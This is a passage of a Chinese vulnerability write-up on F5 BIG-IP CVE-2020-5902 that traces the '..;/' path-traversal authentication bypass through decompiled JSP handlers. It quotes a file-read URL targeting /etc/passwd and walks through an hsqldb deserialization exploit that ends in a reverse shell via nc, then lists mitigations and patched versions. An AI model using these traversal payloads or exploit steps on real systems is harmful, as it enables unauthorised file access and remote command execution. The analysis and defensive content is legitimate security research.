返回源文件继续分析，之后会调用request.getRemoteUser()方法获取请求数据中的用户名信息，之后根据用户名信息是否为空做逻辑判断，当用户名为空会通过F5Properties.getAPPlicationString方法来为用户名赋值(应用名称)，如果添加一个请求属性"com.f5.corba.username"并为其赋值"username"，之后创建一个空的User对象实例，之后通过一个while循环来打印输出请求头信息，之后创建一个User示例并赋值给之前的空User示例user，然后判断用户的RoleId是否大于900，如果大于900则打印错误日志到控制台并直接返回(默认返回900)：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHiaCtV6k3LZ9XjuibAibtlybjQsq8oWxsSJKNpcLic2MvUuTz0dyyWXM7rA/640?wx_fmt=png "")  
  
同时会调用WebUtils.setPartitio进行一些赋值操作，具体如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHBuicI9KUVcicSahavWcGGtJCTDwFicOItFVrutHcTmySoGibo8gbGf0hhQ/640?wx_fmt=png "")  
  
在最后会去调用controller.processWebRequest()方法并将指向结果赋值给requestForwarded，当返回的requestForwarded的值为true时会继续调用fail函数来输出错误信息，并清空buffer：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH37fpWTiaknumhvgwwxzTRMg3NLZRv10AyuwRE3OmTyKaMVPwmlWQXLg/640?wx_fmt=png "")  
  
之后跟进processWebRequest方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHDia9ibjVZPUax2HRb3kHMj5YJAy4IEtrOskab2mhEFeyxg3sEa12nqNQ/640?wx_fmt=png "")  
  
在函数开头处的61行调用  
Mappings.getRequestByURL(this.request.getPathInfo())   
方法来获取当前路由的requestMapping配置，我们跟进去会发现  
该方法会根据request.getPathInfo() 的Servlet路径返回相对应的Handler类名：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHMY1OOZKvuLPMJlUBVAibCI1kaUibbXbXTsKiaWCpGQ7rymazd2Sh1taXA/640?wx_fmt=png "")  
  
之后我们继续下面的逻辑分析，可以看到之后初始化了currentUserLeve为900，并通过User.getUser()来获取用户信息，如果用户信息不为空则进入if语句中继续调用示例化后的user的getRoleID来重置currentUserlevel，之后再调用requestHandler.getAllowedLevels来设置allowedLevels，之后依据allowedLevels的值并通过if判断来判别当前用户是否有访问目标URL的权限，此处因为路由访问权限校验：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHF8p3H7NV3bsXBybPmDoRtNGP0C4iaq946Uv2kcPEbTDg6Nd8buFw3xg/640?wx_fmt=png "")  
  
User.haveAccessToAtLeastOneTargetLevel() 方法代码如下，可以看到此时会初始化一个Boolean变量的userHasAccess变量，并赋值为false，之后通过循环来比较当前用户的Role与要访问的目标URL所具备的Level(类似于权限)是否有匹配项，如果匹配则重置userHasAccess为true并返回，如果没有匹配项则返回初始化后  
userHasAccess的默认值，即False:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHSWhu08RPJgwVVAKqEYMbtpkVfBEIMtK3ibs54yAJREmdC5RtYN6u7aA/640?wx_fmt=png "")  
  
完整的用户角色对照表如下所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH4xOUsCP8jlUkKPEwXUtsFJoTUlqaZBm2EkeVxcK2zPsdETl8R8Txqg/640?wx_fmt=png "")  
  
之后当有访问权限时则调根据/WEB-INF/web.xml 的路由调用对应的类进程处理：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHicedaJldb0ZWFrMFuJrIIWVp2nNW3icScB8PljYhibMemfPndJMmKLLXQ/640?wx_fmt=png "")  
  
在这里也许会有人问，此时的请求流程中不是使用了权限校验吗？而且使用的是getPathinfo()这种较为安全的方法来获取(其他的请求方法的安全性问题可以参考：https://xz.aliyun.com/t/7544，同时经过这里的表述也可以发现及时后端代码中使用较为安全的请求处理当服务器端配置不当依旧可能造成安全问题)，为什么会有问题呢？我们下面捋一下：  
- 恶意请求：  
  
https://server/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd  
  
- Apache解析：  
  
https://server/tmui/login.jsp  
/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd(重点关注前面一部分，且允许被访问，转至Tomcat)  
  
- Tomcat解析：  
  
https://server/tmui/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd(见到/..;/后向上层回溯一次，改变原先URL)  
  
- request.getPathInfo()：/tmui/login.jsp(获取原请求的中传递到Servlet的请求，在进行权限校验时对此路径的访问进行校验，login.jsp任意用户都可访问)  
  
上面的流程已经很清晰了，这里不再赘述，下面我们来看后端的代码是如何实现的，准确定位到相关的文件与请求处理函数~  
###### 后端代码处理处理  
  
文件读取  
  
漏洞文件：  
  
tmui1\WEB-INF\classes\org\apache\jsp\tmui\locallb\workspace\fileRead_jsp.class  
  
文件分析：在漏洞文件fileRead_jsp.java程序中，我们可以看到对于一次文件读取请求首先会获取filename，之后根据传入的文件名称调用WorkspaceUtils.readFile()函数来读取文件，之后输出读取的结果  

```
publicvoid _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        HttpSession session = null;
        JspWriter out = null;
        JspWriter _jspx_out = null;
        PageContext _jspx_page_context = null;


try {
            response.setContentType(&#34;text/html&#34;);
            PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
            _jspx_page_context = pageContext;
            ServletContext application = pageContext.getServletContext();
            ServletConfig config = pageContext.getServletConfig();
            session = pageContext.getSession();
out = pageContext.getOut();
out.write(&#34;\n\n\n\n&#34;);
            String fileName = WebUtils.getProperty(request, &#34;fileName&#34;);


try {
                JSONObject resultObject = WorkspaceUtils.readFile(fileName);
out.print(resultObject.toString());
            } catch (IOException var19) {
throw var19;
            }
        } catch (Throwable var20) {
if (!(var20 instanceof SkipPageException)) {
out = (JspWriter)_jspx_out;
if (_jspx_out != null && ((JspWriter)_jspx_out).getBufferSize() != 0) {
try {
if (response.isCommitted()) {
out.flush();
                        } else {
out.clearBuffer();
                        }
                    } catch (IOException var18) {
                    }
                }


if (_jspx_page_context == null) {
thrownew ServletException(var20);
                }


                _jspx_page_context.handlePageException(var20);
            }
        } finally {
            _jspxFactory.releasePageContext(_jspx_page_context);
        }
```

  
之后我们可以从导入包中看到  
WorkspaceUtils来自：com.f5.tmui.locallb.handler.workspace.WorkspaceUtils  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH9vMMm6OH3tTGLc02N8FALZ43M7KWBuqGW65QLtQibNJv97ib7kbdjPicA/640?wx_fmt=jpeg "")  
  
所以我们依旧使用JD-GUI来查找，之后找到WorkspaceUtils.readFile()代码如下所示，非常简单，直接读取文件内容并返回，在整个流程中未对读取的fileName的path路径做校验与限制(例如：使用白名单+start.with()来限制目录等方法)，同时为对当前用户进行二次鉴权操作，鉴权只停留在请求处理中，在Servlet处理过程中未做权限检查(这一点在开发中应该值得深思，做权限校验可以加强权限机制，同时在一定程度上规避由于中间件配置不当或解析特性造成的安全问题)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHCngLuAxnqiavhibIjQLIRWHcEZAhYHjSfwic9X9CLAkl6VfLquCtRktaQ/640?wx_fmt=png "")  
  
所以，整个文件读取中，我们无需再次进行权限校验，filename可以任意指定，由于权限校验在之前的请求处理流程中已经被绕过，也就是说我们只要访问到该文件并向其发送一个请求即可实现任意文件读取了，So Easy~  
  
列目录项  
  
这个漏洞准确的来说应该是"列目录"，只是为了对其规范一下，所以加了一个字，看的顺眼一些，算是"强迫症"吧~  
  
漏洞文件：  
  
tmui1\WEB-INF\classes\org\apache\jsp\tmui\locallb\workspace\directoryList_jsp.class  
  
文件分析：directoryList_jsp的核心代码如下所示：  

```
publicvoid _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        HttpSession session = null;
        JspWriter out = null;
        JspWriter _jspx_out = null;
        PageContext _jspx_page_context = null;


try {
            response.setContentType(&#34;text/html&#34;);
            PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
            _jspx_page_context = pageContext;
            ServletContext application = pageContext.getServletContext();
            ServletConfig config = pageContext.getServletConfig();
            session = pageContext.getSession();
out = pageContext.getOut();
out.write(&#34;\n\n\n\n&#34;);
            String directoryPath = WebUtils.getProperty(request, &#34;directoryPath&#34;);


try {
                JSONObject resultObject = WorkspaceUtils.listDirectory(directoryPath);
out.print(resultObject);
            } catch (IOException var19) {
throw var19;
            }
        } catch (Throwable var20) {
if (!(var20 instanceof SkipPageException)) {
out = (JspWriter)_jspx_out;
if (_jspx_out != null && ((JspWriter)_jspx_out).getBufferSize() != 0) {
try {
if (response.isCommitted()) {
out.flush();
                        } else {
out.clearBuffer();
                        }
                    } catch (IOException var18) {
                    }
                }


if (_jspx_page_context == null) {
thrownew ServletException(var20);
                }


                _jspx_page_context.handlePageException(var20);
            }
        } finally {
            _jspxFactory.releasePageContext(_jspx_page_context);
        }
```

  
在这里依旧未做二次权限校验，直接获取directoryPath的值，之后将其作为参数传递给WorkspaceUtils.listDirectory进行逻辑处理，并将结果打印显示，我们继续跟进到  
WorkspaceUtils.listDirectory函数看看：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHXAfD69Naz4GAAAfbRAVeG62TSScicQm16evl7wWXOM5d6ayyyGesF7w/640?wx_fmt=png "")  
  
  
可以看到，此处会调用listDirectoryRecursive并以directory以及children作为参数传递，我们跟进去看看，此处通过一个递归来读取显示所有的文件名称，具体逻辑如下所示，点很简单，不再赘述：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH2VmeJ7oQexHq3rniaKIA56tYicRYt6tE662GSJ4tAZpMk1sXFl8ypjUA/640?wx_fmt=png "")  
  
命令执行  
  
文件路径：  
  
tmui1\WEB-INF\classes\org\apache\jsp\tmui\locallb\workspace\tmshCmd_jsp.class  
  
文件内容：tmshCmd_jsp核心操作代码如下所示  

```
publicvoid _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        HttpSession session = null;
        JspWriter out = null;
        JspWriter _jspx_out = null;
        PageContext _jspx_page_context = null;


try {
            response.setContentType(&#34;text/html&#34;);
            PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
            _jspx_page_context = pageContext;
            ServletContext application = pageContext.getServletContext();
            ServletConfig config = pageContext.getServletConfig();
            session = pageContext.getSession();
out = pageContext.getOut();
out.write(&#34;\n\n\n\n\n\n&#34;);
            F5Logger logger = (F5Logger)F5Logger.getLogger(this.getClass());
            String tmshResult = &#34;&#34;;
            String cmd = WebUtils.getProperty(request, &#34;command&#34;);
if (cmd != null && cmd.length() != 0) {
                JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd);
                tmshResult = resultObject.toString();
            } else {
                logger.error(NLSEngine.getString(&#34;ilx.workspace.error.TmshCommandFailed&#34;));
            }


out.write(10);
out.write(10);
out.print(tmshResult);
out.write(10);
        } catch (Throwable var20) {
if (!(var20 instanceof SkipPageException)) {
out = (JspWriter)_jspx_out;
if (_jspx_out != null && ((JspWriter)_jspx_out).getBufferSize() != 0) {
try {
if (response.isCommitted()) {
out.flush();
                        } else {
out.clearBuffer();
                        }
                    } catch (IOException var19) {
                    }
                }


if (_jspx_page_context == null) {
thrownew ServletException(var20);
                }


                _jspx_page_context.handlePageException(var20);
            }
        } finally {
            _jspxFactory.releasePageContext(_jspx_page_context);
        }
```

  
从上述代码中我们可以看到此处依旧未做二次校验认证，从请求中获取参数command之后赋值给cmd，之后再将cmd作为参数传递给WorkspaceUtils.runTmshCommand：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHNlNAhibog4VtVN3cLnRD55B6GCKqYNmKOOmiaEZ0ysZ1P97vOsiaOXIlQ/640?wx_fmt=jpeg "")  
  
下面我们继续跟踪一下  
WorkspaceUtils.runTmshCommand的处理流程，我们可以看到此处对command的合法性进行了校验，同时对操作类型进行了匹配看是否是create、delete、list、modify，这设计到tmsh命令集，有兴趣了解的可以百度一下，你想要的有很多，同时这里也说明了我们当初在漏洞利用阶段为什么要将bash设置别名为list，而不是直接使用bash来执行命令，回忆一下看看！！！之后我们可以看到我们的command直接通过该调用Syscall.CallExec去执行命令，此时参数为Syscall.callEvelated：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHWicsQPcCtw3gudEJ6uMBuHc50bq2tVGicp0N2GRFbbcIA5dxnkouOqicA/640?wx_fmt=png "")  
  
下面我们继续跟踪到callElevated中看看：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHX8BDPPsiaia4wLtUuUELZibbYiaslYYvXWQtibuKZo7JP4JZ2A2n7IibAk3w/640?wx_fmt=png "")  
  
在这里调用当前类的call方法，注意此时传入的第三个参数哦，之后继续跟踪进入call，  
从下图可以看到，此时首先对要执行的命令的合法性做一个检查()，之后对命令进行匹配以及权限校验，此时的elevated为刚才传进去的"true"，之后创建DataObject对象实例，  
并通过通过om.queryStats(query)来执行并返回最后的结果，之后返回：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHU9FGB0GDEU1rseI4MrticibCe87dAicaHHrfV0lpgM7z554acghss8UEg/640?wx_fmt=png "")  
  
关于tmsh的更多命令请自行百度~  
  
文件上传  
  
文件路径：  
  
tmui1\WEB-INF\classes\org\apache\jsp\tmui\locallb\workspace\fileSave_jsp.class  
  
文件分析：文件核心代码如下所示  

```
publicvoid _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        HttpSession session = null;
        JspWriter out = null;
        JspWriter _jspx_out = null;
        PageContext _jspx_page_context = null;


try {
            response.setContentType(&#34;text/html&#34;);
            PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
            _jspx_page_context = pageContext;
            ServletContext application = pageContext.getServletContext();
            ServletConfig config = pageContext.getServletConfig();
            session = pageContext.getSession();
out = pageContext.getOut();
out.write(10);
out.write(10);
out.write(10);
            String fileName = WebUtils.getProperty(request, &#34;fileName&#34;);
            String content = WebUtils.getProperty(request, &#34;content&#34;);


try {
                WorkspaceUtils.saveFile(fileName, content);
            } catch (IOException var20) {
throw var20;
            }


out.write(10);
        } catch (Throwable var21) {
if (!(var21 instanceof SkipPageException)) {
out = (JspWriter)_jspx_out;
if (_jspx_out != null && ((JspWriter)_jspx_out).getBufferSize() != 0) {
try {
if (response.isCommitted()) {
out.flush();
                        } else {
out.clearBuffer();
                        }
                    } catch (IOException var19) {
                    }
                }


if (_jspx_page_context == null) {
thrownew ServletException(var21);
                }


                _jspx_page_context.handlePageException(var21);
            }
        } finally {
            _jspxFactory.releasePageContext(_jspx_page_context);
        }
```

  
saveFile函数代码如下所示，从这里可以直接根据提供的文件名创建文件并写入内容，之后赋予权限与改变文件拥有者完成写文件操作(其实准确来说应该是创建文件，而不是上传文件，不过由于文件名以及文件路径和文件内容可控，可以说是一个间接性的文件上传)：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHWfiafwLdzJqxBL4ojGsLbDrRwZ1WFYk5vwgqHZHN7IoCvbJqECRr0Yg/640?wx_fmt=png "")  
  
##### 关于EXP的思考  
  
在这里我们要提到一个EXP：https://github.com/jas502n/CVE-2020-5902  
  
首先，说一下曲折的道路：在该EXP的项目中，我们注意到了几个类似于上面文件分析的代码文件，刚开始笔者以为这应该是存在漏洞的文件，结果跟踪了一下发现存在矛盾，感觉此处的设置应该不会导致安全问题，权限校验以及逻辑非常清晰，可以说很Good~，之后无奈的去微信公众号中找了一些相关的文章发现很多都是关于漏洞复现的，很是无语，于是再找....,过了一段时间(大概半天)，找到了一篇文件，结果发现该国内知名安全公司的分析进竟然也是拿着这个文件进行了一波分析，而且跳过了关键的一些操作，例如isFileWhitelisted等，笔者觉得很是不对，于是剩下的就是想方法获取源码了，之后搭建靶机，发现开启SSH端口，且密码为初始设置的密码，所以不再为内部"内部"只读的事情烦恼，直接SSH连接上去，之后下载下来，导入IDEA分析~  
  
之所以说上面的这些是因为，如果有人去分析的话不要再去拿这个代码去分析了，同时也表明该代码在逻辑设计上的安全设计值的思考与学习，可以说是JAVA开发人员的一个很好的借鉴点，这里以文件读取为例对其安全机制做说明：  
  
核心点如下所示：  

```
publicvoid _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
      HttpSession session = null;
      JspWriter out = null;
      JspWriter _jspx_out = null;
      PageContext _jspx_page_context = null;


try {
         response.setContentType(&#34;text/html&#34;);
         PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
         _jspx_page_context = pageContext;
         ServletContext application = pageContext.getServletContext();
         ServletConfig config = pageContext.getServletConfig();
         session = pageContext.getSession();
out = pageContext.getOut();
out.write(&#34;\n\n\n\n\n\n\n\n\n\n\n&#34;);
         String fileName = WebUtils.getProperty(request, &#34;fileName&#34;);
         String username = request.getRemoteUser();
         Enumeration headerNames = request.getHeaderNames();
         Map headers = new HashMap();
if (username == null) {
            username = F5Properties.getApplicationString(&#34;auth.override_user&#34;);
         }


while(headerNames.hasMoreElements()) {
            String headerName = (String)headerNames.nextElement();
            headers.put(headerName, request.getHeader(headerName));
         }


         User user = new User(username, headers);
         UsernameHolder.setUser(user);


try {
if (!WorkspaceUtils.isFileWhitelisted(fileName)) {
thrownew IllegalAccessException(&#34;Forbidden to access file &#34; + fileName);
            }


if (!WorkspaceUtils.userCanAccessPartition(user, fileName, false)) {
thrownew IllegalAccessException(&#34;Forbidden to access file &#34; + fileName);
            }


            JSONObject resultObject = WorkspaceUtils.readFile(fileName);
out.print(resultObject.toString());
         } catch (IOException var24) {
throw var24;
         } catch (IllegalAccessException var25) {
throw var25;
         }
      } catch (Throwable var26) {
if (!(var26 instanceof SkipPageException)) {
out = (JspWriter)_jspx_out;
if (_jspx_out != null && ((JspWriter)_jspx_out).getBufferSize() != 0) {
try {
if (response.isCommitted()) {
out.flush();
                  } else {
out.clearBuffer();
                  }
               } catch (IOException var23) {
               }
            }


if (_jspx_page_context == null) {
thrownew ServletException(var26);
            }


            _jspx_page_context.handlePageException(var26);
         }
      } finally {
         _jspxFactory.releasePageContext(_jspx_page_context);
      }


```

  
  
在上述代码中在直接使用readFie之前会对filename进行一次校验：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHmiaTFPVAWlHmicVIG6MKuBHIiaElsm1yRdvzCyx5jnrBj5wwQdpDwKWng/640?wx_fmt=png "")  
  
  
之后跟进该函数中，可以看到会使用getCanonicalPath()来获取当前文件名的路径信息，同时该函数会过滤掉路径中类似于".."的特殊符号，这是其一，另外在这里会创建一个whilelistDirSet的迭代器并结合while循环来依次判断当前的filename是否在白名单中，当然此时的比较对象为realDirPath即父级目录的绝对路径信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHKQ8GngdyNZOeGiaECVVmDNvDNRiaYQrsrnrfibk2AXP37PU2ehslcvsUQ/640?wx_fmt=png "")  
  
在这里我看一下  
whilelistDirSet，可以看到添加的白名单有"/var/ilx/workspaces/", "/var/sdm/plugin_store/plugins/"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHUXKC6NGBKqXfmrfzPqgUfgiaNG0WJwKKGcbuhM5mfgTQXMjKvMm7IibQ/640?wx_fmt=png "")  
  
之后还有一个有意思的地方是还会对当前操作的用户进行一次全新校验检测，函数WorkspaceUtils.userCanAccessPartition如下所示，自己分析即可：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHPt39iafb9HibicoOmFfc5AlwQJian6elwLRGn2CjvETuFCxo7X2lxg6Bdw/640?wx_fmt=png "")  
  
在这之后我们才可以进行文件读取，假设我们的主机上存在之前所说的漏洞，那么我们后端的代码改成这样可以有效防御吗？答案是：一定程度上可以，至少在这里是可以的，因为整个文件系统体系结构庞大也说不是上还有其他的地方存在相关的漏洞，这也不好说~  
  
还有一个就是再进行命令执行时，有一次CSRF Token校验，这也值得学习与借鉴：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH0F1SUG72KmzcVntkRAq8icyYkCcvT3icjPvxLAE0XNvtRib65BeNSICkA/640?wx_fmt=png "")  
  
  
在该EXP中的java文件可以说是一种很好的修复策略，涉及到了以下几点：  
  
1、二次权限校验  
  
2、白名单策略限制文件读取的路径  
  
3、采用CSRF Token机制  
  
4、命令合法性检测机制  
  
当然，该漏洞要想规避的最佳策略还是需要结合服务器端的配置以及后端代码的来进行修复~  
#### NewPOC  
##### 故事概览  
  
在我们好奇为什么整个流程分析下来感觉和之前漏洞文件与安全应用程序文件差异对比中的hsqldb始终没有出现呢？  
  
2020年7月7日，TEAM ARES安全研究团队披露出一则新的POC，该POC使用JAVA反序列化配合CVE-2020-5902漏洞来执行命令，涉及的类正是org.hsqldb.util.scriptool.main，整个思路较为新颖，而且前一种EXP的利用需要近期有用户进行登录操作才可以实现RCE以及反弹shell，如果没有用户登录则只能读取一些服务器端可读文件以及可读目录下的文件内容，而该EXP一方面可以躲避WAF的检测与拦截(就目前而言)，另一方面由于F5 BIG-IP默认在初始化状态下会运行Hysql，导致攻击者可以通过远程访问并利用org.hsqldb.util.scriptool.main自身的反序列化Gadget来实现RCE，该EXP利用范围显得更加广泛，整个故事如下：  
  
TEAM ARES首先对官方给出的补丁进行了分析：  
  
官方给出的缓解措施中通过修改配置项来规避路径穿越造成的文件读取以及命令执行：  
  
https://support.f5.com/csp/article/K52145254  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH3hRAH0ZQhR2nRd1qz2AEgp0nF2flddbZRykTgcUkPXOKqhfQjiaQV4Q/640?wx_fmt=png "")  
  
之后通过比较漏洞版本15.1.0 和修改版本15.1.0.4.发现有很多不同点，首先是配置项发生了变化，  
该配置项使得当攻击者企图通过..;/来达访问未授权的页面时都会被重定向到404页面：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHnZoKPTmUsx5RHm6Wtf1mhV3xpwBzgXxTGgyvCuoS261tREQ5TUCMsw/640?wx_fmt=jpeg "")  
  
还  
有一个特殊的点就是Apache configuration中的/hsqldb被移除了：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHLgvz8Zgo3wGeK0iaTia9FGVIXU6VotsULTkZWEZ0ZQoh4GMibntPwWV4A/640?wx_fmt=png "")  
  
在正常情形下我们直接请求hsqldb是会被重定向到登陆认证页面：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHSVhmFj5oQcGDiaaCpMpJoCHKbsJjibY4PV4kHn554uibBRibqibhFVZH9nA/640?wx_fmt=png "")  
  
但是，发现在请求URL后面追加分号";"后即可绕过认证，正常访问hsqldb：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHeD2uyGZ37cwzz3RRwso3wib1vSsBncZ51cxBzof0ia9T2N5pas1UP7jQ/640?wx_fmt=png "")  
  
那么通过/hsqldb我们又可以做点什么呢？之后了解到hypersql是java应用程序使用的嵌入式关系数据库，其某些方法可能存在被滥用的风险。  
  
刚开始，我们尝试使用用户定义函数(UDF)，然而我们发现该特性在1.8版中不可用，不过幸运的是我们发现我们可以调用本机java函数以及服务器可用的任何方法，主要限制是它必须是静态方法，之后在hsqldb源代码中寻找静态方法，我们发现org.hsqldb.util.scriptool.main()方法反序列化了一个表示为ascii十六进制字符串的java对象，这看起来非常有利用价值，所以我们尝试使用sqltool来手动调用它，并遇到了“序列化失败”错误：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH443mkT5Gr6fNgjBtjuXw093JjewFR6VkicF4ibe8jibc4UwMHLdVFHeEA/640?wx_fmt=png "")  
  
  
从上面的错误消息中我们可以看到只需要将enableunsafeserialization属性设置为true，即可成功执行payload，此时，我们证明了经过身份验证的远程代码执行是可能的，之后试图使用/hsqldb;来绕过原先的身份认证并实现RCE，结果post请求导致了连接错误，所以我们再次查看了缓解措施中的建议——regex”.*\.\.;.* "并注意到原Bypass是"..;”,然后，我们改变了Exploit，使其直接访问hqsldb：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHQgjBBibvSxJIhO7mBjJZYnCBkAqIweqLdPibUVmkYymbwGdTvLibqCTxg/640?wx_fmt=jpeg "")  
  
  
##### 漏洞分析  
  
关于这个漏洞，笔者从原靶机下载hsqldb.jar包并导入JD-GUI进行分析时，首先定位到关键的函数org.hsqldb.ScriptTool.class的main函数中，并跟踪了整个流程，发现并未出现反序列化的操作，之后全局搜索关键词deserialize发现在getObject处被调用，之后方向追溯getObject函数的调用点，发现Function.class与Column.class两处，之后在Column中对函  
数convertObject进行溯源，发现在jdbcPreparedStatement.class处被调用，之后再次溯源函数setParameter发现setAsciiStream处被调用，这是较为符合TEAM ARES在描述中所说“反序列化了一个表示为ascii十六进制字符串的java对象”，但是在ScriptTool中执行过程中并未调用，除非是参数处理时先对参数的输入流进行解析规范化；另外对Function.class中的函数getArguments进行跟踪溯源到getValue()，这里依旧未在org.hsqldb.ScriptTool.class的main函数执行过程中找到，关于这两点笔者并不确定，所以也不在进行深入了，相关截图也不放进来了，总体感觉耗费的时间有点长了，有兴趣的可以研究一下，关于原代码中的核心代码以及原EXP、New EXP还有jar包都放在了GitHub上，有兴趣的可以研究一下~  
  
GitHub：https://github.com/Al1ex/CVE-2020-5902  
##### 漏洞利用  
  
下载EXP到本地:  
  
https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHic9EsCAxbjhMr9q0fkeLxyuSCeIgmlWebkgFdVGfWkZGH5FzA5e5MEw/640?wx_fmt=png "")  
  
  
PS:同时需要自我下载ysoser到本地，下载地址：  
  
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar  
  
之后修改HOST文件，将目标IP与localhost.localdomain的绑定，在实施攻击时我们使用域名来指定攻击目标：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHcVmIa1NIVKR5gGIA3ZhqnRiaN8wbAIZxDp51662DwKR8RleAWgItptg/640?wx_fmt=png "")  
  
  
然后使用nc监听本地的1234 端口：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHw2SCQfFcjKGye6dkiaaOTkQibZUfQMDpEWr9KkQLpWLIibyDiaetqUrokg/640?wx_fmt=jpeg "")  
  
启动hsqldb数据库：  

```
java-classpathhsqldb.jarorg.hsqldb.WebServer
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHbXZHYHJWCuttwby7JEkxsq4bfNZSiaKlUaJnL6rpJHgzgdMbTkNucMw/640?wx_fmt=jpeg "")  
  
  
执行 exp  

```
./CVE-2020-5902.sh localhost.localdomain 192.168.174.131 1234


说明：
./CVE-2020-5902.sh <server><localip><localport>
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHVHcVtJ9hpI3wU4SbnfAGr3DEIe84OnBA7XicKtfWb3GicHHmDAYbsTIw/640?wx_fmt=jpeg "")  
  
  
之后成功反弹shell回来：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHo2E1fmKJKdATr9xqJyorIXKSDeedKNGicNI6GuKyiaKicCOMWAEL4L8Hw/640?wx_fmt=jpeg "")  
  
#### 防御措施  
##### 缓解措施  
  
1、登陆 TMOS Shell（tmsh）执行  

```
tmsh
```

  
2、修改 httpd 配置信息  

```
edit /sys httpd all-properties
```

  
3、文件内容如下  

```
include 'FileETag MTime Size
<LocationMatch &#34;;&#34;>
Redirect 404 /
</LocationMatch>
<LocationMatch &#34;hsqldb&#34;>
Redirect 404 /
</LocationMatch>
'
```

  
4、按照以下操作保存文件  

```
 按下 ESC 并依次输入
:wq
```

  
5、执行命令刷新配置文件  

```
save /sys config
```

  
6、重启httpd服务  

```
restart sys service httpd
```

  
7、禁用IP对TMUI界面的访问  
##### 应用升级  
- BIG-IP 15.x: 15.1.0.4  
  
- BIG-IP 14.x: 14.1.2.6  
  
- BIG-IP 13.x: 13.1.3.4  
  
- BIG-IP 12.x: 12.1.5.2  
  
